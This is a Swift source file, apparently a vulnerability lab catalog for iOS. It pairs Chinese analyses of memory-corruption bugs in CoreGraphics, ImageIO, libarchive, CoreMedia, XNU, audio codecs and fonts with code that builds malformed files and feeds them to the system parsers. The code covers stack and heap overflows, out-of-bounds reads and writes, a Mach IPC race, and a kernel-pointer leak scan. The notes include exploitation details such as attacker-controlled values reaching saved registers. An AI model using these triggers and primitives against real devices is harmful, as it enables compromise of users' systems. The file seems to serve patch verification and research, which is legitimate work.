import Foundation
import UIKit
import ImageIO

enum Catalog {

    static let all: [ExploitModule] = coreGraphics + imageIO + imageIO2 + archive + archive2 + coreMedia + crossSandbox + kernel + audio + audio2 + video + fonts + font2 + kext + userspace + tooling + probes + arrivals

    /// Modules that pin a fix Apple shipped in 27.2 (i.e. carry a CVE number). Computed,
    /// never hardcoded — the overview subtitle reads it, so it cannot go stale.
    static var locatedFixes: Int { all.filter { $0.cve.hasPrefix("CVE-") }.count }

    // MARK: - CoreGraphics

    static let coreGraphics: [ExploitModule] = [
        ExploitModule(
            id: "cg.shading",
            titleZh: "Type-5 阴影栈溢出（值可控 OOB 写）",
            cve: "CVE-2026-112611",
            component: "CoreGraphics · _cg_shading_type5_draw",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 1,
            summaryZh: "/ShadingType 5 的 /Function 声明的 /Range 维度与 /ColorSpace 的分量数不一致。绘制时 _cg_shading_type5_draw 为每个三角形顶点构造一条 72 字节网格记录，颜色区位于记录 +0x20、容量为 nc×8 字节，随后调用 CGFunctionEvaluate —— 该函数以其自身 [func+0x30] 字段（即 /Range 维度）为上界，向该颜色区写入 range 个 double。写入长度与目标容量之间没有任何比较。网格数组由 CGTriangleMeshCreate 在栈上 alloca，故最后一条记录的写会依次越过记录尾、辅助数组、行缓冲与保存寄存器。",
            notesZh: "取 R=136、nc=1、/C0=/C1=1.0 时，每次写入的 double 位模式均为 0x3FF0000000000000。溢出同时覆盖溢出的三角形计数与网格指针两个 spill 槽；循环退出比较读到被覆盖后的计数后继续执行，随后解引用被覆盖的网格指针。因此崩溃地址即 PDF 选定的 double 位模式加一个结构偏移 —— 设备实测 0x3ff000000000001c，其中 0x1c = idx×16 + 0xc。27.2 在解析期以 CG-SEC-187882049 拒绝该字典，draw 代码两侧字节完全一致，属纯闸门修复。",
            run: { ctx in
                let pdf = PDFPayload.shading(rangeDim: 136, value: 1.0)
                let url = ctx.write("crash_shading_r136.pdf", pdf)
                ctx.arm("cg.shading", "render R=136")
                let detail = try Runners.renderPDF(pdf)
                ctx.disarm("cg.shading", detail)
                return ModuleOutcome(headline: tl("渲染存活 — 该构建未受影响"),
                                     detail: detail,
                                     evidence: ["PDF \(pdf.count) B", "R=136 vs nc=1"],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "cg.shading.sweep",
            titleZh: "溢出长度扫描（找吸收阈值）",
            cve: "CVE-2026-112611",
            component: "CoreGraphics · Type-5 shading",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 1,
            summaryZh: "短溢出会被相邻 VLA 吸收而不触发故障 —— 写入必须足够长才能触及活状态。本轮将 R 由 4 递增至 256，逐一记录是否仍能完成渲染，从而标定该构建上栈布局的实际边界。该阈值决定后续所有负载的长度预算。",
            notesZh: "按升序执行。小 R 先完成，进程在第一个致命 R 处终止，写前日志保留最后一个成功值，因此单次运行即可定位边界。",
            run: { ctx in
                let ladder = [4, 8, 12, 16, 24, 32, 48, 64, 96, 136, 192, 256]
                var survived: [Int] = []
                var lines: [String] = []
                for r in ladder {
                    ctx.arm("cg.shading.sweep", "R=\(r)")
                    let pdf = PDFPayload.shading(rangeDim: r, value: 1.0)
                    do {
                        let detail = try Runners.renderPDF(pdf)
                        survived.append(r)
                        lines.append(tl("R=") + "\(r)" + tl(" 存活 — ") + "\(detail)")
                        ctx.disarm("cg.shading.sweep", "R=\(r) survived")
                    } catch {
                        lines.append(tl("R=") + "\(r)" + tl(" 被拒绝 — ") + "\(error.localizedDescription)")
                        ctx.disarm("cg.shading.sweep", "R=\(r) refused")
                    }
                }
                return ModuleOutcome(headline: tl("全部 ") + "\(ladder.count)" + tl(" 个长度存活"),
                                     detail: lines.joined(separator: "\n"),
                                     evidence: [tl("存活: ") + "\(survived.map(String.init).joined(separator: ", "))"])
            }),

        ExploitModule(
            id: "cg.cmap",
            titleZh: "CMap /UseCMap 递归越界写（负结果探针）",
            cve: "CVE-2026-112610",
            component: "CoreGraphics · _cmap_convert",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 3,
            summaryZh: "_cmap_convert 在递归时把外层的 codespace 长度（最大 255）传入仅容纳单个结果的输出槽（2 字节 code / 8 字节 len）。27.2 增加 min(L,4) 钳制并重排输出槽布局。",
            notesZh: "源分析中，内嵌 CMap 这一载体被三条相互独立的可达性阻断否定。本模块的价值在于将负结果同样留档：若该构建上出现崩溃，说明载体已被重新打通，结论需随之修正。",
            run: { ctx in
                let pdf = PDFPayload.cmapProbe(codespaceLength: 128)
                let url = ctx.write("cmap_probe.pdf", pdf)
                ctx.arm("cg.cmap", "render cmap")
                let detail = try Runners.renderPDF(pdf)
                ctx.disarm("cg.cmap", detail)
                return ModuleOutcome(headline: tl("渲染存活（与源分析的负结果一致）"),
                                     detail: detail,
                                     evidence: ["PDF \(pdf.count) B", tl("codespace 长度 128")],
                                     artifacts: [url])
            }),
    ]

    // MARK: - ImageIO

    static let imageIO: [ExploitModule] = [
        ExploitModule(
            id: "iio.tiff.planar",
            titleZh: "TIFF planar 散写越界",
            cve: "CVE-2026-112633 / 112614",
            component: "ImageIO · decodeStripPlanar",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 2,
            summaryZh: "当 PlanarConfiguration=2 且 SamplesPerPixel 大于 Photometric 所指的通道数时，散写指针的偏移以 32 位乘法计算，且计算结果与目标行容量之间不存在任何比较。27.2 改为 64 位 umull 并比对所需字节数与容量。",
            notesZh: "24A435 的报错串不存在：\"*** ERROR: decodeStripPlanar destination row is %u bytes, the scatter needs %llu\"。",
            run: { ctx in
                let tiff = TIFFPayload.planarScatter(width: 64, height: 64, spp: 4)
                let url = ctx.write("planar_scatter.tif", tiff)
                ctx.arm("iio.tiff.planar", "decode planar")
                let r = try Runners.decodeImage(tiff)
                ctx.disarm("iio.tiff.planar", "decoded \(r.width)x\(r.height)")
                return ModuleOutcome(headline: tl("解码存活 ") + "\(r.width)" + tl("×") + "\(r.height)",
                                     detail: tl("帧数 ") + "\(r.frameCount)" + tl("，已解码 ") + "\(r.decoded)" + tl("，属性 ") + "\(r.properties)",
                                     evidence: ["TIFF \(tiff.count) B", "spp=4 photometric=RGB"],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.tiff.trunc",
            titleZh: "TIFF 截断条带 → 未初始化堆进像素",
            cve: "CVE-2026-112632",
            component: "ImageIO · decodeStripChunky",
            primitive: .infoLeak,
            reach: .inProcess,
            tier: 2,
            summaryZh: "TIFFReadEncodedStrip 的返回值未被检查。读取失败时，未初始化的 malloc 条带缓冲被散写进输出图像，故解码所得像素即为进程堆中的残留内容。",
            notesZh: "判别方法：对同一文件连续解码三次并比对输出指纹。若条带区域每次不同，即证明取到的是未初始化堆。27.2 将其零填充并输出 \"strip %d is zero-filled\"。",
            run: { ctx in
                let tiff = TIFFPayload.truncatedStrip(width: 32, height: 32)
                let url = ctx.write("trunc_strip.tif", tiff)
                ctx.arm("iio.tiff.trunc", "decode truncated strip")
                var digests: [String] = []
                for i in 0..<3 {
                    if let src = CGImageSourceCreateWithData(tiff as CFData, nil),
                       let img = CGImageSourceCreateImageAtIndex(src, 0, nil),
                       let data = img.dataProvider?.data as Data? {
                        var hash: UInt64 = 0xcbf29ce484222325
                        for b in data.prefix(4096) { hash = (hash ^ UInt64(b)) &* 0x100000001b3 }
                        digests.append(String(format: "run%d: %016llx (%d B)", i, hash, data.count))
                    } else {
                        digests.append(tl("run") + "\(i)" + tl(": 解码失败"))
                    }
                }
                ctx.disarm("iio.tiff.trunc", "3 runs")
                let unstable = Set(digests.map { $0.split(separator: ": ").last.map(String.init) ?? $0 }).count > 1
                return ModuleOutcome(headline: unstable ? tl("输出不稳定 — 未初始化内存迹象") : tl("输出稳定"),
                                     detail: digests.joined(separator: "\n"),
                                     evidence: ["TIFF \(tiff.count) B", tl("3 次解码指纹")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.apng.fctl",
            titleZh: "APNG fcTL 截断 → 栈上未初始化帧几何",
            cve: "CVE-2026-112630",
            component: "ImageIO · IIO_Reader_PNG::getImageCount",
            primitive: .infoLeak,
            reach: .inProcess,
            tier: 2,
            summaryZh: "在 fcTL 偏移处读取 34 字节，且不检查返回值。当文件在 fcTL 中间被截断时，该 34 字节栈缓冲只有前部被写入，其余部分作为帧宽、高、偏移与延时被解析。",
            notesZh: "27.2 改为读 26 字节并检查 cmp x0,#0x1a，报 \"*** truncated 'fcTL' chunk at offset %ld\"。",
            run: { ctx in
                let png = PNGPayload.apngTruncatedFCTL()
                let url = ctx.write("apng_trunc_fctl.png", png)
                ctx.arm("iio.apng.fctl", "getImageCount")
                let r = try Runners.decodeImage(png)
                ctx.disarm("iio.apng.fctl", "count=\(r.frameCount)")
                return ModuleOutcome(headline: tl("帧数 ") + "\(r.frameCount)",
                                     detail: tl("解码 ") + "\(r.decoded)" + tl("，尺寸 ") + "\(r.width)" + tl("×") + "\(r.height)" + tl("\n属性: ") + "\(r.properties)",
                                     evidence: ["PNG \(png.count) B", tl("fcTL 声明 26B 实到 4B")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.jpeg.marker",
            titleZh: "JPEG 标记长度越界",
            cve: "CVE-2026-112634",
            component: "ImageIO · _JPEGFile::processData",
            primitive: .oobRead,
            reach: .inProcess,
            tier: 2,
            summaryZh: "当标记声明的长度远超实际存在的字节数时，27.0 仅记录一条 \"*** WARNING: check markerLength\" 并继续解析，导致越界读取；27.2 直接中止解析。",
            notesZh: "长度 0xFFEE，实际负载 28 字节。",
            run: { ctx in
                let jpg = JPEGPayload.markerLength(declared: 0xFFEE, actual: 30)
                let url = ctx.write("markerlen.jpg", jpg)
                ctx.arm("iio.jpeg.marker", "decode")
                let r = try Runners.decodeImage(jpg)
                ctx.disarm("iio.jpeg.marker", "decoded=\(r.decoded)")
                return ModuleOutcome(headline: tl("解析存活（已解码=") + "\(r.decoded)" + tl("）"),
                                     detail: tl("帧数 ") + "\(r.frameCount)" + tl("，属性 ") + "\(r.properties)",
                                     evidence: ["JPEG \(jpg.count) B", tl("声明长度 65518")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.jpeg.comment",
            titleZh: "EXIF UserComment 短读 → 元数据泄露",
            cve: "CVE-2026-112571",
            component: "ImageIO · ReadUserComment",
            primitive: .infoLeak,
            reach: .inProcess,
            tier: 2,
            summaryZh: "getBytesAtOffset 的返回值未被检查。当条目值偏移落在标记之外时发生短读，malloc 缓冲尾部保持未初始化，随后该缓冲作为 UserComment 元数据返回给调用方 —— 构成对进程堆的直接读取。",
            notesZh: "count 声明 0x400，值偏移 +0x4000。返回值里会打印实际拿到的字节数与前 24 字节。",
            run: { ctx in
                let jpg = JPEGPayload.exifUserComment(count: 0x400, valueOffset: 0x4000)
                let url = ctx.write("exif_comment.jpg", jpg)
                ctx.arm("iio.jpeg.comment", "read properties")
                let r = try Runners.decodeImage(jpg)
                ctx.disarm("iio.jpeg.comment", "props read")
                return ModuleOutcome(headline: tl("元数据读取完成"),
                                     detail: r.properties.isEmpty ? tl("无可用属性") : r.properties,
                                     evidence: ["JPEG \(jpg.count) B", "UserComment count=1024 offset=16384"],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.jpeg.gps",
            titleZh: "GPS IFD 值偏移越界",
            cve: "CVE-2026-112629",
            component: "ImageIO · GPSCopy::processData",
            primitive: .oobRead,
            reach: .inProcess,
            tier: 2,
            summaryZh: "GPS-IFD 遍历使用裸指针解引用与一个未检查的 read32。当条目值偏移指向 GPS 块之外时，读取直接越界。27.2 将全部访问重写为 checkCapacity / checkInitializedLength / pointerToOffset / read32Unchecked，违规时抛出 OutOfBounds 异常。",
            notesZh: "GPSAltitude 的 RATIONAL 偏移指向 +0x10000 处。",
            run: { ctx in
                let jpg = JPEGPayload.exifGPSOutOfBounds(delta: 0x10000)
                let url = ctx.write("exif_gps_oob.jpg", jpg)
                ctx.arm("iio.jpeg.gps", "read GPS")
                let r = try Runners.decodeImage(jpg)
                ctx.disarm("iio.jpeg.gps", "read")
                return ModuleOutcome(headline: tl("GPS 读取存活"),
                                     detail: r.properties.isEmpty ? tl("无可用属性") : r.properties,
                                     evidence: ["JPEG \(jpg.count) B", tl("值偏移 +65536")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.dds.bc7",
            titleZh: "BC7 纹理 mip 截断",
            cve: "CVE-2026-112627",
            component: "ImageIO · BCReadPlugin::initialize",
            primitive: .oobRead,
            reach: .inProcess,
            tier: 2,
            summaryZh: "截断的 mip 层级在 27.0 仅产生一条 WARNING 后继续块解码，块解码器随即读到数据之外。27.2 将「零个完整 mip」变为硬错误，并补上 64 位 mip 尺寸运算与尺寸/数据量闸门。",
            notesZh: "512×512 BC7 需要 65536 字节，实际只给 64 字节。",
            run: { ctx in
                let dds = TexturePayload.bc7Short(width: 512, height: 512, dataBytes: 64)
                let url = ctx.write("bc7_short.dds", dds)
                ctx.arm("iio.dds.bc7", "decode")
                let r = try Runners.decodeImage(dds)
                ctx.disarm("iio.dds.bc7", "decoded=\(r.decoded)")
                return ModuleOutcome(headline: tl("解码存活（已解码=") + "\(r.decoded)" + tl("）"),
                                     detail: tl("尺寸 ") + "\(r.width)" + tl("×") + "\(r.height)",
                                     evidence: ["DDS \(dds.count) B", tl("需要 65536 B，实际 64 B")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "iio.ktx2",
            titleZh: "KTX2 维度/层级尺寸运算",
            cve: "CVE-2026-112625",
            component: "ImageIO · KTX2ReadPlugin",
            primitive: .intOverflow,
            reach: .inProcess,
            tier: 2,
            summaryZh: "KTX/KTX2 的层级字节数与块数运算缺少 64 位 umull/umulh 保护，且既有检查所依据的量本身是错的（使用 channels 而非源 bpp）。27.2 增加 \"image dimensions overflow\" 与 \"expected %llu bytes\" 两道闸门。",
            notesZh: "维度 0xFFFF×0xFFFF，层级索引声明 64 字节。",
            run: { ctx in
                guard let data = ctx.seed("ktx2_bad_dims.ktx2") else {
                    throw LabError(message: tl("种子缺失 ktx2_bad_dims.ktx2"))
                }
                let url = ctx.write("ktx2_bad_dims.ktx2", data)
                ctx.arm("iio.ktx2", "decode")
                let r = try Runners.decodeImage(data)
                ctx.disarm("iio.ktx2", "decoded=\(r.decoded)")
                return ModuleOutcome(headline: tl("解码存活（已解码=") + "\(r.decoded)" + tl("）"),
                                     detail: tl("尺寸 ") + "\(r.width)" + tl("×") + "\(r.height)",
                                     evidence: ["KTX2 \(data.count) B"],
                                     artifacts: [url])
            }),
    ]

    // MARK: - libarchive

    static let archive: [ExploitModule] = [
        ExploitModule(
            id: "arc.iso",
            titleZh: "ISO9660 Joliet 路径名堆溢出",
            cve: "CVE-2026-112522",
            component: "libarchive · build_pathname_utf16be",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 1,
            summaryZh: "build_pathname_utf16be 在递归拼入父路径之后无条件写入 2 字节的 UTF-16BE '/'，且不再复核累计长度是否超过 1024 的上限。当目录链累计长度恰为 1024 字节时，最深层回卷的写入落在 p[1024] 与 p[1025]，越过 malloc(1024) 两个字节，其中 0x002F 覆盖相邻堆块头。",
            notesZh: "目录链长度 4×206 + 192 + 4×2 = 1024，与上限精确对齐。已在 macOS 同版本 fork 上以 bsdtar 复现，硬件断点命中于 \"Pathname is too long\" 之前的写指令。",
            run: { ctx in
                guard let iso = ctx.seed("joliet_path_oob.iso") else {
                    throw LabError(message: tl("种子缺失 joliet_path_oob.iso"))
                }
                let url = ctx.write("joliet_path_oob.iso", iso)
                ctx.arm("arc.iso", "iterate headers")
                let (entries, status) = try Runners.Archive.list(iso)
                ctx.disarm("arc.iso", "entries=\(entries.count)")
                return ModuleOutcome(headline: tl("遍历完成，") + "\(entries.count)" + tl(" 条目"),
                                     detail: entries.joined(separator: "\n") + tl("\n状态: ") + "\(status)",
                                     evidence: ["ISO \(iso.count) B", tl("累计路径 1024 B")],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "arc.iso.stress",
            titleZh: "Joliet 路径长度循环",
            cve: "CVE-2026-112522",
            component: "libarchive · build_pathname_utf16be",
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 1,
            summaryZh: "对同一 ISO 反复遍历，使 2 字节越界写在堆上多次发生并与其它分配交错。单次两字节的写通常被 malloc 元数据吸收，重复执行才可能将损坏推移到可见位置。",
            notesZh: "32 轮，每轮新建 archive 句柄。",
            run: { ctx in
                guard let iso = ctx.seed("joliet_path_oob.iso") else {
                    throw LabError(message: tl("种子缺失"))
                }
                ctx.arm("arc.iso.stress", "32 rounds")
                var lines: [String] = []
                for i in 0..<32 {
                    do {
                        let (entries, status) = try Runners.Archive.list(iso)
                        lines.append(tl("round ") + "\(i)" + tl(": ") + "\(entries.count)" + tl(" 条目 / ") + "\(status)")
                    } catch {
                        lines.append("round \(i): \(error.localizedDescription)")
                    }
                }
                ctx.disarm("arc.iso.stress", "32 rounds done")
                return ModuleOutcome(headline: tl("32 轮完成，进程存活"),
                                     detail: lines.suffix(10).joined(separator: "\n"),
                                     evidence: [tl("重复越界写 32 次")])
            }),
    ]

    // MARK: - CoreMedia

    static let coreMedia: [ExploitModule] = [
        ExploitModule(
            id: "cm.rpu",
            titleZh: "Dolby Vision RPU 扩展元数据块数组越界",
            cve: "CVE-2026-112688",
            component: "CoreMedia · hevcbridgeParseVdrDmDataPayloadExMetadataBlocks",
            primitive: .oobWrite,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "三个固定容量数组（A: 4×28 B，B: 8×14 B，C: 5×36 B）在写入前没有计数上界。27.0 的 cmp + b.hi 仅跳过计数自增，写入仍以未检查的计数为索引执行。数组 A 的越界写会越过 0x73b4 字节结构体末端，落入调用者的保存寄存器区 —— CMGetDMVersionLevelFromRPU 将该结构体置于自身栈帧。",
            notesZh: "该行是公告中唯一明确标注「任意代码执行」的 CoreMedia 条目。头部语法在源研究中仅重建至入口检查（magic / rpu_type / rpu_format 已在 macOS 孪生上实测通过），故此处采用参数化语法探针，以解析器自身返回的错误作为进度回执。",
            run: { ctx in
                let payload = RPUPayload.probe(blockID: 1, blockCount: 6)
                let url = ctx.write("rpu_probe_1x6.bin", payload)
                var version: UInt32 = 0
                var level: UInt32 = 0
                ctx.arm("cm.rpu", "parse rpu")
                let rc = try Runners.rpuParse(payload, version: &version, level: &level)
                ctx.disarm("cm.rpu", "rc=\(rc)")
                return ModuleOutcome(headline: tl("解析返回 ") + "\(rc)",
                                     detail: tl("OSStatus=") + "\(rc)" + tl("  dmVersion=") + "\(version)" + tl("  dmLevel=") + "\(level)" + tl("\n负载 ") + "\(payload.count)" + tl(" B，block-id 1 × 6（容量 4）"),
                                     evidence: ["RPU \(payload.count) B"],
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "cm.rpu.sweep",
            titleZh: "RPU 块数与块类型扫描",
            cve: "CVE-2026-112688",
            component: "CoreMedia · DOVI RPU",
            primitive: .oobWrite,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "依次用 block-id 1/2/6 分别打三个数组（容量 4/8/5），每种块类型从刚好越界一个到越界八个，记录解析器在哪个点开始拒绝或崩溃。",
            notesZh: "数组 A 是唯一逃出结构体、进入保存寄存器的那一个；B 和 C 是结构体内跨字段污染。",
            run: { ctx in
                var lines: [String] = []
                let plans: [(UInt32, [Int])] = [(1, [5, 6, 8]), (2, [9, 12, 16]), (6, [6, 8, 10])]
                ctx.arm("cm.rpu.sweep", "sweep")
                for (blockID, counts) in plans {
                    for c in counts {
                        let payload = RPUPayload.probe(blockID: blockID, blockCount: c)
                        var v: UInt32 = 0
                        var l: UInt32 = 0
                        do {
                            let rc = try Runners.rpuParse(payload, version: &v, level: &l)
                            lines.append("id=\(blockID) n=\(c) → rc=\(rc) v=\(v) l=\(l)")
                        } catch {
                            lines.append("id=\(blockID) n=\(c) → \(error.localizedDescription)")
                        }
                    }
                }
                ctx.disarm("cm.rpu.sweep", "done")
                return ModuleOutcome(headline: tl("扫描完成"), detail: lines.joined(separator: "\n"))
            }),
    ]

    // MARK: - Kernel

    static let kernel: [ExploitModule] = [
        ExploitModule(
            id: "kern.ipc",
            titleZh: "ipc_port 请求表索引竞态",
            cve: "CVE-2026-112507 / 112476",
            component: tl("XNU · ipc_port.c 请求表消费方"),
            primitive: .uaf,
            reach: .kernel,
            tier: 2,
            summaryZh: "27.2 为每个消费 per-space 端口请求表索引的函数补入 cmp/b.hi 与 NULL 陷阱（ipc_port.c:21/24/34/38/40/41）。27.0 的 free 路径计算了边界却丢弃结果，仍以未检查的基址执行读改写；mark 路径则完全没有边界计算。索引取自 space 中保存的请求表下标，故缺陷形状为「表增长或拆除」与「通知注册或消息发送」并发下的陈旧索引。",
            notesZh: "该路径上原本被认为无 entitlement 门槛的入口是 mach_msg 与端口通知注册。真机实测（iOS 27.0.1，iPhone 19,7）与 macOS 27 上，mach_port_request_notification 的 13 种类型/权限组合全部返回 -300（MIG_TYPE_ERROR）：内核拒绝为第三方进程武装请求表项。没有请求表项，就没有可被竞态消费的陈旧索引 —— 本模块因此是一个可达性负结果，而不是竞态证据。armed 计数为 0 时，任何“survived”都不构成 112507 结论。",
            run: { ctx in
                let baseline = KernelIPC.baseline()
                ctx.arm("kern.ipc", "race 6s")
                let stats = KernelIPC.race(seconds: 6.0, workers: 4, depth: 48)
                ctx.disarm("kern.ipc", "ops=\(stats.operations) armed=\(stats.armed) refused=\(stats.notificationsRefused)")
                var lines = [stats.summary, ""]
                lines.append(tl("— 基线 —"))
                for (k, v) in baseline.sorted(by: { $0.key < $1.key }) {
                    lines.append("\(k): \(v)")
                }
                if stats.armed == 0 && stats.notifications > 0 {
                    lines.append("")
                    lines.append(tl("— 可达性判定 —"))
                    lines.append(tl("通知注册成功 0 次，拒绝 ") + "\(stats.notificationsRefused)" + tl(" 次，内核返回 -300（MIG_TYPE_ERROR）。"))
                    lines.append(tl("请求表项从未建立，竞态没有可消费的对象：本模块未触达 112507。"))
                    lines.append(tl("已完成的 ") + "\(stats.allocations)" + tl(" 次分配/拆除只证明端口名称空间可用，不是漏洞证据。"))
                }
                let headline: String
                if stats.armed == 0 && stats.notifications > 0 {
                    headline = tl("通知注册全程 -300 — 112507 路径未武装（负结果）")
                } else if !stats.kernelErrors.isEmpty {
                    headline = tl("竞态完成，内核返回 ") + "\(stats.kernelErrors.count)" + tl(" 类错误码")
                } else {
                    headline = tl("竞态完成 ") + "\(stats.operations)" + tl(" 次操作，无异常返回")
                }
                return ModuleOutcome(headline: headline,
                                     detail: lines.joined(separator: "\n"),
                                     evidence: baseline.map { "\($0.key): \($0.value)" })
            }),

        ExploitModule(
            id: "kern.decmpfs",
            titleZh: "decmpfs 分块解压欠产出 → 内核堆泄露",
            cve: "CVE-2026-113910",
            component: "XNU · AppleFSCompressionTypeZlib",
            primitive: .infoLeak,
            reach: .kernel,
            tier: 2,
            summaryZh: "分块 zlib 解压的实际产出少于预期时，27.0 不比对 produced 与 expected，内核页缓冲的尾部因此保持未写状态；read() 随后将整个缓冲交回应用，使应用取得陈旧的堆内容。27.2 补入该比对。",
            notesZh: "这是整套原语中少数完全不需要 entitlement 的内核路径：应用在自身容器内写入一个带 com.apple.decmpfs 扩展属性的文件，读回的内容即内核解压的产物。以 8 字节窗口扫描，凡落在内核地址空间范围（≥ 0xFFFFFFE000000000）的值即为候选指针。",
            run: { ctx in
                let url = ctx.workdir.appendingPathComponent("decmpfs_probe.bin")
                ctx.arm("kern.decmpfs", "roundtrip")
                var lines: [String] = []
                var totalHits = 0
                for (chunks, produce) in [(4, 65536), (4, 4096), (8, 1024), (2, 1)] {
                    let r = Runners.decmpfsProbe(at: url,
                                                 uncompressed: chunks * 65536,
                                                 chunks: chunks,
                                                 producePerChunk: produce)
                    totalHits += r.kernelPointerHits
                    lines.append("chunks=\(chunks) produce=\(produce): xattr=\(r.wroteXattr) read=\(r.readBack)B hits=\(r.kernelPointerHits) — \(r.note)")
                    if !r.samples.isEmpty {
                        lines.append(tl("  候选: ") + r.samples.joined(separator: ", "))
                    }
                }
                ctx.disarm("kern.decmpfs", "hits=\(totalHits)")
                return ModuleOutcome(headline: totalHits > 0 ? tl("发现 ") + "\(totalHits)" + tl(" 个内核指针候选") : tl("未发现内核指针"),
                                     detail: lines.joined(separator: "\n"),
                                     artifacts: [url])
            }),

        ExploitModule(
            id: "kern.baseline",
            titleZh: "Mach 命名空间基线",
            cve: "—",
            component: "XNU · mach_port",
            primitive: .probe,
            reach: .kernel,
            tier: 3,
            summaryZh: "读取 bootstrap 端口与自身端口命名空间，确认竞态前的起点：能不能列出端口、能拿到多少个名字。",
            notesZh: "任何一次竞态结果都要和这个基线一起看。",
            run: { ctx in
                ctx.arm("kern.baseline", "collect")
                let base = KernelIPC.baseline()
                ctx.disarm("kern.baseline", "collected")
                return ModuleOutcome(headline: tl("基线已采集"),
                                     detail: base.map { "\($0.key) = \($0.value)" }.sorted().joined(separator: "\n"))
            }),
    ]

    // MARK: - Audio

    static let audio: [ExploitModule] = [
        ExploitModule(
            id: "aud.lc3",
            titleZh: "LC3 解码器输入缓冲溢出",
            cve: "CVE-2026-112638",
            component: "AudioCodecs · ACLC3Decoder::AppendInputData",
            primitive: .oobWrite,
            reach: .entitlementGated,
            tier: 2,
            summaryZh: "memcpy 仅以 mDataByteSize 作为长度，完全不参考输入 vector 的 (begin, end) 容量。27.2 增加 capacity < size 时的拒绝分支。LC3 是蓝牙 LE Audio 的编解码器，其实例化受 com.apple.coreaudio.allow-lc3-codec 授权约束，故崩溃发生在系统音频进程内 —— 与公告所称「系统终止」一致。",
            notesZh: "这个模块先检查进程是否持有该 entitlement，再尝试构造 LC3 AudioConverter 看内核/框架在哪一层拒绝。无授权时它一定失败，但失败点本身就是有用信息。",
            run: { ctx in
                ctx.arm("aud.lc3", "probe")
                var lines: [String] = []
                let ents = Entitlements.dump()
                let lc3 = ents["com.apple.coreaudio.allow-lc3-codec"]
                lines.append("com.apple.coreaudio.allow-lc3-codec = \(lc3.map { "\($0)" } ?? tl("缺失"))")
                lines.append(Runners.audioConverter(format: 0x6C633320, sampleRate: 48000, channels: 1))
                lines.append(Runners.audioConverter(format: 0x6C633320, sampleRate: 16000, channels: 2))
                ctx.disarm("aud.lc3", "probe complete")
                return ModuleOutcome(headline: lc3 == nil ? tl("无授权 — 只能走无线链路") : tl("持有授权"),
                                     detail: lines.joined(separator: "\n"))
            }),

        ExploitModule(
            id: "aud.hoa",
            titleZh: "HOA 空间音频系数越界读",
            cve: "CVE-2026-112546",
            component: "AudioCodecs · APACHOADecoder::Initialize",
            primitive: .oobRead,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "mNumHOAcoeffs 由文件内的 hoa::CodecConfig 反序列化取得。既有检查仅拦下大于 122 的值，而 37 至 121 之间的取值会索引一个长度为 37 的数组。27.2 将比较阈值改为 0x25。",
            notesZh: "系数上限来自 kMaxNumSCs_DynSelSCs4EachSB。这条要真正打进去需要 MPEG-H / 沉浸式音频文件，应用侧只能探到解码器是否可达。",
            run: { ctx in
                ctx.arm("aud.hoa", "probe")
                var lines: [String] = []
                let libs = ["/System/Library/Frameworks/AudioToolbox.framework/AudioToolbox",
                            "/System/Library/PrivateFrameworks/AudioToolboxCore.framework/AudioToolboxCore",
                            "/System/Library/Frameworks/AudioToolbox.framework/AudioCodecs"]
                for lib in libs {
                    guard let h = dlopen(lib, RTLD_NOW) else {
                        lines.append("✗ \(lib)")
                        continue
                    }
                    var found: [String] = []
                    for sym in ["HOASpatialDecoder", "APACHOADecoder", "UniDrcSelection", "mpddrc"] {
                        if dlsym(h, sym) != nil { found.append(sym) }
                    }
                    lines.append(tl("✓ ") + "\(lib)" + tl(" 命中: ") + "\(found.isEmpty ? tl("无") : found.joined(separator: ", "))")
                }
                lines.append(Runners.audioConverter(format: 0x6D686D31, sampleRate: 48000, channels: 4))
                ctx.disarm("aud.hoa", "probe complete")
                return ModuleOutcome(headline: tl("解码器可达性探测完成"),
                                     detail: lines.joined(separator: "\n"))
            }),

        ExploitModule(
            id: "aud.haptic",
            titleZh: "AVHaptic 自定义音频事件格式校验",
            cve: "CVE-2026-113907",
            component: "AudioToolbox · AVHapticServerInstance",
            primitive: .oobWrite,
            reach: .systemProcess,
            tier: 2,
            summaryZh: "createCustomAudioEvent 在 27.0 既不校验 ASBD 的合法性，也不比对 frames×bytesPerFrame 与实际波形字节数。27.2 同时补入这两项校验。该接口的 XPC 服务端位于 CoreHaptics 的服务器进程内。",
            notesZh: "通过 CHHapticEngine 的 audioCustom 事件驱动，是最接近服务端入参的一条公开路径。",
            run: { ctx in
                ctx.arm("aud.haptic", "register + play")
                let report = Runners.hapticCustomAudio(frameCount: 4096, declaredBytes: 4)
                ctx.disarm("aud.haptic", "played")
                return ModuleOutcome(headline: tl("触觉事件已尝试"), detail: report)
            }),
    ]

    // MARK: - Fonts / ModelIO

    static let fonts: [ExploitModule] = [
        ExploitModule(
            id: "font.cff",
            titleZh: "CFF Type2 charstring 操作数栈溢出",
            cve: "CVE-2026-112683",
            component: tl("FontParser · charstring 解释器"),
            primitive: .oobWrite,
            reach: .inProcess,
            tier: 2,
            summaryZh: "Type2 charstring 解释器的操作数栈为固定 48 项数组。27.0 仅在 pop 路径检查计数，push 路径不做检查。27.2 补入 Push/Pop 两道栈保护，并将扫描暂存区的 32 位乘法改为 64 位，同时修正了符号扩展指针。",
            notesZh: "这个种子是一个裸 CFF：单个 charstring 连推 300 个操作数再 endchar。绘制字形才会真正执行解释器。",
            run: { ctx in
                guard let cff = ctx.seed("stack_bomb.cff") else {
                    throw LabError(message: tl("种子缺失 stack_bomb.cff"))
                }
                let url = ctx.write("stack_bomb.cff", cff)
                ctx.arm("font.cff", "load + draw")
                do {
